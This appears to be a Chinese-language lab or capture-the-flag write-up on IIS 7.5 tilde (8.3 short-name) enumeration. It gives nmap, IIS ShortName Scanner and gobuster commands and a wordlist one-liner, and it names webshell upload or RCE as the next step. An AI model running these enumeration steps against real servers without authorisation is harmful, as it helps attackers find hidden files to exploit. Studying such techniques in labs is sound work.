# IIS Tilde

### **🔍 1. 發現點**

#### **📌 目標**

* **Microsoft IIS 7.5**
* **可能存在的漏洞：IIS Tilde Enumeration (8.3 短檔案名稱枚舉漏洞)**

#### **🛠 掃描目標**

使用 `nmap` 進行端口掃描，確認 IIS 伺服器版本：

```bash
nmap -p- -sV -sC --open 10.129.224.91
```

**發現 IIS 7.5 在 port 80 運行，該版本可能易受 Tilde 枚舉攻擊。**

***

### **🚀 2. 測試Payload**

#### **📂 使用 IIS ShortName Scanner 進行枚舉**

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

**掃描結果：**

* **識別目錄：** `ASPNET~1`, `UPLOAD~1`
* **識別文件：** `CSASPX~1.CS`, `TRANSF~1.ASP`

#### **📂 使用 Gobuster 暴力破解完整檔名**

**🔹 產生字典**

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

**🔹 使用 Gobuster 嘗試解析完整檔名**

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

**結果：**

* 確認 `TRANSF~1.ASP` 完整檔名為 `transfers.aspx`

***

### **🎯 3. 利用漏洞**

* **已發現可疑 ASPX 文件**
* **下一步：嘗試上傳 WebShell 或利用已知漏洞進行 RCE**

***

### **🔗 5. 連鎖漏洞**

✅ **IIS Tilde 枚舉** → **發現隱藏檔案與目錄**\
✅ **Gobuster 枚舉** → **解析完整檔案名稱**\
✅ **進一步測試該 ASPX 檔案是否可用來上傳 WebShell 或執行 RCE**
